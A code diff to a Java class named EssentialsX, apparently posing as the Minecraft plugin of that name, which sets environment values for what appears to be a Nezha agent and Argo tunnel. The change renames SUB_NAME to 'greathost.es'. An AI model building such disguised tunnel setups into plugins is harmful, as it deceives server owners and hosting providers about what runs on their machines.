@@ -79,7 +79,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("NEZHA_TLS", "1");
         env.put("TMP_ARGO", "ech");
         env.put("EKEY", "");
-        env.put("SUB_NAME", "os");
+        env.put("SUB_NAME", "greathost.es");
         env.put("CF_IP", "ip.sb");
         env.put("AGENT_UUID", "");
         env.put("UUID", "");
